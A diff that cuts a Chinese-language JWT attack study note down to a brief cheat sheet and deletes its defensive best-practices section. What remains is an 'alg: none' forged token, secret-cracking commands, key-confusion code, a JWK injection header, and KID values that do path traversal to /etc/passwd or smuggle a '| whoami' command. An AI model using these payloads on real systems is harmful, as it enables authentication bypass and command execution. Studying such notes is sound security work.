@@ -1,177 +1,49 @@
-# JWT 攻击与安全知识点
+# JWT 攻击
 
-> JSON Web Token — 常用于身份认证和会话管理
-
----
-
-## JWT 结构
-
+## 结构
 ```
 header.payload.signature
+Header: {"alg":"HS256","typ":"JWT"}
+Payload: {"sub":"123","name":"admin","iat":1516239022,"exp":1516242622}
 ```
 
-### Header
-```json
-{
-  "alg": "HS256",
-  "typ": "JWT"
-}
+## alg: none
+将 alg 改为 none，跳过签名验证
+```
+eyJhbGciOiAibm9uZSJ9.eyJhZG1pbiI6dHJ1ZX0.
 ```
 
-### Payload
-```json
-{
-  "sub": "1234567890",
-  "name": "admin",
-  "iat": 1516239022,
-  "exp": 1516242622
-}
-```
-
-### Signature
-```
-HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
-```
-
----
-
-## JWT 攻击类型
-
-### 1. alg: none 攻击
-
-将 `alg` 修改为 `none`，部分库会跳过签名验证：
-
-```json
-// Header
-{"alg": "none", "typ": "JWT"}
-```
-```
-Base64编码后的Token:
-eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.
-注意尾部有个点
-```
-
-### 2. 弱密钥爆破
-
+## 弱密钥爆破
 ```bash
-# 使用 hashcat
 hashcat -m 16500 jwt.txt wordlist.txt
-
-# 使用 jwt_tool
 python3 jwt_tool.py -C -d wordlist.txt token
-
-# 使用 jwt-cracker
-jwt-cracker -t "token" -d wordlist.txt
-
-# 使用 PyJWT 自行爆破
-"""
-import hmac, base64, hashlib
-def b64_decode(data):
-    return base64.urlsafe_b64decode(data + '==')
-"""
 ```
 
-### 3. RS256 → HS256 密钥混淆
-
-当服务器使用 RS256（非对称）而我们可以获取公钥时：
-1. 获取服务器的公钥（`/.well-known/jwks.json`、`/jwks.json` 等）
-2. 修改 `alg` 字段为 `HS256`
-3. 使用公钥作为 HMAC 密钥重新签名
-
+## RS256 → HS256 混淆
+得到公钥后，用公钥做 HMAC 密钥签名
 ```python
 import jwt
-public_key = open("public.pem").read()
-payload = {"user": "admin", "iat": 1234567890}
 token = jwt.encode(payload, public_key, algorithm="HS256")
 ```
 
-### 4. JWK 注入攻击
-
-服务器使用 JWKS 公钥验证签名时，攻击者在 JWT header 中注入恶意 JWK：
+## JWK 注入
+在 header 中嵌入攻击者控制的公钥
 ```json
-{
-  "alg": "RS256",
-  "typ": "JWT",
-  "jwk": {
-    "kty": "RSA",
-    "n": "0vx7agoebGcQSuu...",
-    "e": "AQAB"
-  }
-}
+{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
 ```
-用自己的 RSA 私钥签名，在 header 中嵌入对应的公钥，如果服务器未校验 JWK，即可通过。
 
-### 5. KID 注入攻击
-
-KID (Key ID) 用于指定使用哪个密钥：
-
+## KID 注入
 ```json
-{
-  "alg": "HS256",
-  "typ": "JWT",
-  "kid": "../../../etc/passwd"
-}
+{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}
+{"alg":"HS256","typ":"JWT","kid":"| whoami"}
 ```
-
-```json
-// 命令注入
-{
-  "alg": "HS256",
-  "typ": "JWT",
-  "kid": "| whoami"
-}
-```
-
-### 6. 信息泄露
-
-JWT Payload 只经过 Base64 编码，**不是加密的**！！！
-
-```bash
-# 直接解码获取信息
-echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0" | base64 -d
-```
-
-不要将敏感信息放在 JWT Payload 中！
-
----
-
-## JWT 保护措施
-
-### 服务端最佳实践
-
-1. **使用强密钥** — 至少 256 位随机密钥
-2. **使用 RS256 而非 HS256** — 避免密钥泄露导致整个系统受影响
-3. **验证 alg 字段** — 拒绝 `none` 算法
-4. **设置较短的过期时间** — `exp` 字段
-5. **验证 `nbf` 和 `iat`** — 防止重放
-6. **使用 JTI (JWT ID)** — 一次性 Token
-7. **验证 JWK 来源** — 使用白名单
-8. **KID 路径校验** — 防止路径遍历
-
----
-
-## CTF 常见考点
-
-| 漏洞类型 | 识别方法 | 利用方式 |
-|----------|----------|----------|
-| alg: none | 解码看到 alg 为 HS256/RS256 | 改为 none 重签名 |
-| 弱密钥 | 尝试常见弱口令 | 爆破获取密钥 |
-| RS256→HS256 | 有公钥 | 用公钥 HMAC 签名 |
-| JWK 注入 | 服务器支持 JWK | 生成自有密钥对 |
-| KID 遍历 | 有 KID 字段 | 利用路径遍历读取文件 |
-| 信息泄露 | Base64 解码 Payload | 直接读取 |
 
 ## 工具
-
 ```bash
-# jwt_tool — JWT 综合工具
-python3 jwt_tool.py <jwt_token>
-python3 jwt_tool.py <jwt_token> -T                     # 修改 payload
-python3 jwt_tool.py <jwt_token> -X a                   # none 攻击
-python3 jwt_tool.py <jwt_token> -X k                   # 密钥混淆攻击
-python3 jwt_tool.py <jwt_token> -I -pc name -vc admin  # 修改 payload 内容
+# jwt_tool
+python3 jwt_tool.py <token> -T           # 修改payload
+python3 jwt_tool.py <token> -X a         # none攻击
+python3 jwt_tool.py <token> -X k         # 密钥混淆
 
 # jwt.io — 在线调试
-# PyJWT — Python 库
-pip install pyjwt
 ```
